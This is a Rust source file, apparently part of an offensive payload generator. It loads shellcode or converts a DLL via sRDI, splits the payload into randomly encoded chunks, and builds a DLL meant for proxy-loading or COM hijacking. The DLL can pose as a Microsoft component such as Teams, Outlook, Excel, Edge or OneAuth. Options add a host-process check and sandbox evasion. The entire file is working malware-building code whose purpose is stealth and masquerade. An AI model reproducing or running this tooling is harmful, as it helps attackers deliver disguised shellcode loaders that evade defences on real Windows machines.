#![allow(warnings)]
mod srdi;
use rand::Rng;
use rand::prelude::SliceRandom;
use std::fs::{self, File};
use std::io::{Read, Write};
use my_lib::{
    code_snippet, main_imports, maincargo, auxcargo, sandboximports, sandboxstruct, proceesnamestruct, OneAuth, Ffmpegg, Skpert, BuildScript, SlimCV, ExplorerFrame, FastProx, Mssprxy, Netprofm, Npmproxy, OneCoreCommonProxyStub, Propsys, Stobject, Wbemprox, WebplatStorageServer, WindowsStateRepositoryPS, WindowsStorage, Wpnapps, domain_actions, well_known_domains, cargo_config_toml, rust_toolchain_toml, generate_encoded_shellcode};
use std::process::Command;

pub fn setupcargo(shellcodefile: &str, project_name: &str, _dll_mode: &str, buildtype: &str, sandbox: bool, def_file: &str, export_name_arg: &str, word_at_end: bool) -> (String, String) {
    let _output = Command::new("cargo").args(&["new", project_name]).output().expect("Failed to create a new Rust project");

    let cargo_toml_path = format!("{}/Cargo.toml", project_name);
    let mut cargo_toml = std::fs::OpenOptions::new().append(true).open(cargo_toml_path).expect("Failed to open Cargo.toml");
    let main_dependency = format!(r#"{}"#, maincargo(),);
    let is_shellcode = shellcodefile.ends_with(".bin");

    let shellcode_data = if is_shellcode {
        println!("[*] Raw shellcode input detected: {}", shellcodefile);
        fs::read(shellcodefile).expect("[!] Failed to read shellcode file")
    } else {
        if export_name_arg != "" {
            srdi(shellcodefile, export_name_arg);
            println!("[*] Export name: {}", export_name_arg);
        } else {
            srdi(shellcodefile, "DllMain");
        }
        let data = fs::read("stuff.bin").expect("Failed to read stuff.bin");
        fs::remove_file("stuff.bin").ok();
        data
    };
    println!("[*] Shellcode size: {} bytes", shellcode_data.len());

    // Generate encoded chunks (split into 5-8 chunks randomly)
    let num_chunks = 5 + (rand::thread_rng().gen::<usize>() % 4); // 5-8 chunks

    let (const_arrays, decode_calls) = generate_encoded_shellcode(&shellcode_data, num_chunks);

    // Exports and building dependencies
    let exports_path = format!("{}/exports.def", project_name);
    let mut exports_file = File::create(&exports_path).expect("Failed to create exports.def");
    let mut export_content = String::new(); 
    let mut com_string: &str = "";
    let mut updated_content = String::new();
    let buildscript_path = format!("{}/build.rs", project_name);
    let mut build_script = File::create(&buildscript_path).expect("Failed to create build.rs file");
    let buildscriptcode = format!("{}", BuildScript());
    build_script.write_all(buildscriptcode.as_bytes()).expect("Failed to write build script");

    let new_word = random_word().to_string();
    let mut rng = rand::thread_rng();
    let mut excel_cases = Vec::new();
    let mut outlook_cases = Vec::new();
    let mut msedge_cases = Vec::new();
    let mut msteams_cases = Vec::new();

    // List processes that have multiple COM options
    if project_name == "ExplorerFrame" || project_name == "Outlook" || project_name == "Excel" {
        excel_cases.push((ExplorerFrame(), "{56FDF344-FD6D-11D0-958A-006097C9A090}"));
        outlook_cases.push((ExplorerFrame(), "{56FDF344-FD6D-11D0-958A-006097C9A090}"));
        if project_name == "ExplorerFrame" {
            export_content = format!(r#"{}"#, ExplorerFrame());
            com_string = "{56FDF344-FD6D-11D0-958A-006097C9A090}";
        }
    }
    if project_name == "fastprox" || project_name == "Outlook" || project_name == "Excel" {
        excel_cases.push((FastProx(), "{D68AF00A-29CB-43FA-8504-CE99A996D9EA}"));
        outlook_cases.push((FastProx(), "{D68AF00A-29CB-43FA-8504-CE99A996D9EA}"));
        if project_name == "fastprox" {
            export_content = format!(r#"{}"#, FastProx());
            com_string = "{D68AF00A-29CB-43FA-8504-CE99A996D9EA}";
        }
    }
    if project_name == "propsys" || project_name == "ms-teamsupdate" || project_name == "Excel" || project_name == "msedge" {
        excel_cases.push((Propsys(), "{1F486A52-3CB1-48FD-8F50-B8DC300D9F9D}"));
        msedge_cases.push((Propsys(), "{1F486A52-3CB1-48FD-8F50-B8DC300D9F9D}"));
        msteams_cases.push((Propsys(), "{1F486A52-3CB1-48FD-8F50-B8DC300D9F9D}"));
        if project_name == "propsys" {
            export_content = format!(r#"{}"#, Propsys());
            com_string = "{1F486A52-3CB1-48FD-8F50-B8DC300D9F9D}";
        }
    }
    if project_name == "wbemprox" || project_name == "BackgroundDownload" || project_name == "Excel" || project_name == "Outlook" {
        excel_cases.push((Wbemprox(), "{4590F811-1D3A-11D0-891F-00AA004B2E24}"));
        outlook_cases.push((Wbemprox(), "{4590F811-1D3A-11D0-891F-00AA004B2E24}"));
        if project_name == "wbemprox" {
            export_content = format!(r#"{}"#, Wbemprox());
            com_string = "{4590F811-1D3A-11D0-891F-00AA004B2E24}";
        }
    }
    if project_name == "Windows.StateRepositoryPS" || project_name == "AppHostRegistrationVerifier" || project_name == "Excel" || project_name == "msedge" || project_name == "sihost" {
        excel_cases.push((WindowsStateRepositoryPS(), "{C53E07EC-25F3-4093-AA39-FC67EA22E99D}"));
        msedge_cases.push((WindowsStateRepositoryPS(), "{C53E07EC-25F3-4093-AA39-FC67EA22E99D}"));
        if project_name == "Windows.StateRepositoryPS" {
            export_content = format!(r#"{}"#, WindowsStateRepositoryPS());
            com_string = "{C53E07EC-25F3-4093-AA39-FC67EA22E99D}";
        }
    }
    if project_name == "windows.storage" || project_name == "ms-teamsupdate" {
        msteams_cases.push((WindowsStorage(), "{9AC9FBE1-E0A2-4AD6-B4EE-E212013EA917}"));
        if project_name == "windows.storage" {
            export_content = format!(r#"{}"#, WindowsStorage());
            com_string = "{9AC9FBE1-E0A2-4AD6-B4EE-E212013EA917}";
        }
    }
    if project_name == "mssprxy" || project_name == "SearchProtocolHost" || project_name == "ms-teamsupdate" || project_name == "PhoneExperienceHost" {
        msteams_cases.push((Mssprxy(), "{A5EBA07A-DAE8-4D15-B12F-728EFD8A9866}"));
        if project_name == "mssprxy" {
            export_content = format!(r#"{}"#, Mssprxy());
            com_string = "{A5EBA07A-DAE8-4D15-B12F-728EFD8A9866}";
        }
    }
    if project_name == "npmproxy" || project_name == "msedge" || project_name == "OneDriveStandaloneUpdater" || project_name == "taskhostw" {
        msedge_cases.push((Npmproxy(), "{1299CF18-C4F5-4B6A-BB0F-2299F0398E27}"));
        if project_name == "npmproxy" {
            export_content = format!(r#"{}"#, Npmproxy());
            com_string = "{1299CF18-C4F5-4B6A-BB0F-2299F0398E27}";
        }
    }
    // Random selection for process with multiple COMs
    if project_name == "Excel" {
        let choice = excel_cases.choose(&mut rng).expect("No Excel case found");
        println!("[*] Chose a random COM related to process Excel: {}", choice.1);
        export_content = format!(r#"{}"#, choice.0);
        com_string = choice.1;
    }
    else if project_name == "Outlook" {
        let choice = outlook_cases.choose(&mut rng).expect("No Outlook case found");
        println!("[*] Chose a random COM related to process Outlook: {}", choice.1);
        export_content = format!(r#"{}"#, choice.0);
        com_string = choice.1;
    }
    else if project_name == "msedge" {
        let choice = msedge_cases.choose(&mut rng).expect("No msedge case found");
        println!("[*] Chose a random COM related to process msedge: {}", choice.1);
        export_content = format!(r#"{}"#, choice.0);
        com_string = choice.1;
    }
    else if project_name == "ms-teamsupdate" {
        let choice = msteams_cases.choose(&mut rng).expect("No ms-teamsupdate case found");
        println!("[*] Chose a random COM related to process ms-teamsupdate: {}", choice.1);
        export_content = format!(r#"{}"#, choice.0);
        com_string = choice.1;
    }
    // Handle other as usual
    // DLL proxy targets
    else if project_name == "OneAuth" {
        export_content = format!(r#"{}"#, OneAuth());
        let replacement = if word_at_end { format!("OneAuth-{}", new_word) } else { format!("{}-OneAuth", new_word) };
        updated_content = export_content.replace("old-OneAuth", &replacement);
    } else if project_name == "ffmpeg" {
        export_content = format!(r#"{}"#, Ffmpegg());
        let replacement = if word_at_end { format!("ffmpeg-{}", new_word) } else { format!("{}-ffmpeg", new_word) };
        updated_content = export_content.replace("old-ffmpeg", &replacement);
    } else if project_name == "skypert" {
        export_content = format!(r#"{}"#, Skpert());
        let replacement = if word_at_end { format!("skypert-{}", new_word) } else { format!("{}-skypert", new_word) };
        updated_content = export_content.replace("old-skypert", &replacement);
    } else if project_name == "SlimCV" {
        export_content = format!(r#"{}"#, SlimCV());
        let replacement = if word_at_end { format!("SlimCV-{}", new_word) } else { format!("{}-SlimCV", new_word) };
        updated_content = export_content.replace("old-SlimCV", &replacement);
    } else if project_name == "domain_actions" {
        export_content = format!(r#"{}"#, domain_actions());
        let replacement = if word_at_end { format!("domain_actions-{}", new_word) } else { format!("{}-domain_actions", new_word) };
        updated_content = export_content.replace("old-domain_actions", &replacement);
    } else if project_name == "well_known_domains" {
        export_content = format!(r#"{}"#, well_known_domains());
        let replacement = if word_at_end { format!("well_known_domains-{}", new_word) } else { format!("{}-well_known_domains", new_word) };
        updated_content = export_content.replace("old-well_known_domains", &replacement);
    // COM targets
    } else if project_name == "mssprxy" || project_name == "SearchProtocolHost" || project_name == "ms-teamsupdate" || project_name == "PhoneExperienceHost" {
        export_content = format!(r#"{}"#, Mssprxy());
        com_string = "{A5EBA07A-DAE8-4D15-B12F-728EFD8A9866}";
    } else if project_name == "netprofm" || project_name == "Olk" || project_name == "rdpclip" || project_name == "sdxhelper" || project_name == "werfault" {
        export_content = format!(r#"{}"#, Netprofm());
        com_string = "{DCB00C01-570F-4A9B-8D69-199FDBA5723B}";
    } else if project_name == "npmproxy" || project_name == "msedge" || project_name == "OneDriveStandaloneUpdater" || project_name == "taskhostw" {
        export_content = format!(r#"{}"#, Npmproxy());
        com_string = "{1299CF18-C4F5-4B6A-BB0F-2299F0398E27}";
    } else if project_name == "OneCoreCommonProxyStub" || project_name == "DllHost" || project_name == "Microsoft.SharePoint" || project_name == "MusNotificationUx" {
        export_content = format!(r#"{}"#, OneCoreCommonProxyStub());
        com_string = "{A6FF50C0-56C0-71CA-5732-BED303A59628}";
    } else if project_name == "stobject" {
        export_content = format!(r#"{}"#, Stobject());
        com_string = "{0BFEE0AB-71C3-4FFE-89EF-BD28BEF201E7}";
        //No hits with the latest Win10
    } else if project_name == "webplatstorageserver" {
        export_content = format!(r#"{}"#, WebplatStorageServer());
        com_string = "{178167bc-4ee3-403e-8430-a6434162db17}";
    } else if project_name == "wpnapps" || project_name == "Explorer" {
        export_content = format!(r#"{}"#, Wpnapps());
        com_string = "{6DB7CD52-E3B7-4ECC-BB1F-388AEEF6BB50}";
    }
      if buildtype == "DLL" && !updated_content.is_empty() {
        export_content = updated_content;
    }
    exports_file.write_all(export_content.as_bytes()).expect("Failed to write to file");
    let cargo_toml_path = format!("{}/Cargo.toml", project_name);
    let mut cargo_toml_contents = String::new();
    let mut file = File::open(&cargo_toml_path).expect("Failed to open Cargo.toml");
    file.read_to_string(&mut cargo_toml_contents).expect("Failed to read Cargo.toml");
    let filtered_contents: Vec<&str> = cargo_toml_contents.lines().filter(|line| *line != "[dependencies]").collect();
    let new_contents = filtered_contents.join("\n");

    fs::write(&cargo_toml_path, new_contents).expect("Failed to write updated Cargo.toml");
    let compileflags = format!(r#"{}"#, auxcargo(),);
    let mut dependency = format!("{}{}", main_dependency, compileflags);
    writeln!(cargo_toml, "{}", dependency).expect(" [!] Failed to write to Cargo.toml");

    // Create .cargo directory and config.toml with Windows build optimizations
    let cargo_dir_path = format!("{}/.cargo", project_name);
    fs::create_dir_all(&cargo_dir_path).expect("[!] Failed to create .cargo directory");
    let cargo_config_path = format!("{}/.cargo/config.toml", project_name);
    let mut cargo_config = File::create(&cargo_config_path).expect("[!] Failed to create .cargo/config.toml");
    cargo_config
        .write_all(cargo_config_toml().as_bytes())
        .expect("[!] Failed to write to .cargo/config.toml");

    // Create rust-toolchain.toml to pin Rust version to 1.85.0
    let rust_toolchain_path = format!("{}/rust-toolchain.toml", project_name);
    let mut rust_toolchain = File::create(&rust_toolchain_path).expect("[!] Failed to create rust-toolchain.toml");
    rust_toolchain
        .write_all(rust_toolchain_toml().as_bytes())
        .expect("[!] Failed to write to rust-toolchain.toml");
    
    let main_rs_path = format!("{}/src/main.rs", project_name);


    let mut main_rs_content = format!(r#"{}"#, code_snippet());
    
    // Extract target DLL name from exports.def for DLL proxy projects
    if buildtype == "DLL" && (project_name == "OneAuth" || project_name == "ffmpeg" || project_name == "skypert" || project_name == "SlimCV" || project_name == "domain_actions" || project_name == "well_known_domains") {
        let target_dll_name = if project_name == "OneAuth" {
            if word_at_end { format!("OneAuth-{}", new_word) } else { format!("{}-OneAuth", new_word) }
        } else if project_name == "ffmpeg" {
            if word_at_end { format!("ffmpeg-{}", new_word) } else { format!("{}-ffmpeg", new_word) }
        } else if project_name == "skypert" {
            if word_at_end { format!("skypert-{}", new_word) } else { format!("{}-skypert", new_word) }
        } else if project_name == "SlimCV" {
            if word_at_end { format!("SlimCV-{}", new_word) } else { format!("{}-SlimCV", new_word) }
        } else if project_name == "domain_actions" {
            if word_at_end { format!("domain_actions-{}", new_word) } else { format!("{}-domain_actions", new_word) }
        } else if project_name == "well_known_domains" {
            if word_at_end { format!("well_known_domains-{}", new_word) } else { format!("{}-well_known_domains", new_word) }
        } else {
            "unknown".to_string()
        };
        // Replace placeholder with actual target DLL name
        main_rs_content = main_rs_content.replace("TARGET_DLL_NAME_PLACEHOLDER", &target_dll_name);
        println!("[*] Target DLL name set to: {}.dll", target_dll_name);
    }
    
    if buildtype == "Process" {
        println!("[*] Adding Process check");
        let template = format!(r#"{}"#, proceesnamestruct());
        let value = project_name;
        let value = value.to_lowercase();
        let updated_template = template.replace("PLACEHOLDER1", value.as_str());
        main_rs_content = format!("{}\n{}", main_rs_content, updated_template);
        println!("[+] DLL will only run under {}.exe", value);
    }
    if buildtype == "Custom" && !def_file.is_empty() {
        let def_content = fs::read_to_string(def_file).expect("Failed to read .def file");
        fs::write(&exports_path, def_content).expect("Failed to write to exports.def");
        println!("[*] Custom .def file processed and used for the project.");
    }
        
    let mut main_rs_imports = format!(r#"{}"#, main_imports());
    let mut main_rs_decryption_imports: String = "".to_string();
    let mut main_rs_decryption: String = "".to_string();
    if sandbox == true {
        println!("[*] Enabled sandbox evasion");
        main_rs_content = format!("{}\n{}", main_rs_content, sandboxstruct());
        main_rs_imports = format!("{}\n{}", main_imports(), sandboximports());
    } else {
        println!("[*] Sandbox evasion not enabled...");
    }
    let mut combined_code = format!("{}{}\n{}\n{}", main_rs_imports, main_rs_decryption_imports, main_rs_content, main_rs_decryption);
    
    // Replace placeholders with encoded shellcode chunks
    combined_code = combined_code.replace("SHELLCODE_CONST_ARRAYS_PLACEHOLDER", &const_arrays);
    combined_code = combined_code.replace("SHELLCODE_DECODE_CALLS_PLACEHOLDER", &decode_calls);

    
    let mut main_rs = File::create(main_rs_path).expect("Failed to open main.rs");
    main_rs.write_all(combined_code.as_bytes()).expect("[!] Failed to write to main.rs");
    let old_file_name = format!("{}/src/main.rs", project_name);
    let new_file_name = format!("{}/src/lib.rs", project_name);
    fs::rename(old_file_name, new_file_name).expect("Failed to rename generated main.rs to lib.rs");
    (new_word.to_string(), com_string.to_string())
}

fn random_word() -> &'static str {
    let words = ["Windows", "Excel", "Word", "OneDrive", "Azure", "SharePoint", "OneNote", "Edge", "Xbox", "Surface", "Bing", "Skype", "Dynamics", "Old", "Yammer"];
    words.choose(&mut rand::thread_rng()).unwrap_or(&"default")
}

pub fn srdi(shellcodefile: &str, export: &str) {
    println!("[*] Starting SRDI processing of {} ", shellcodefile);
    srdi::create_srdi_payload(shellcodefile, export)
}
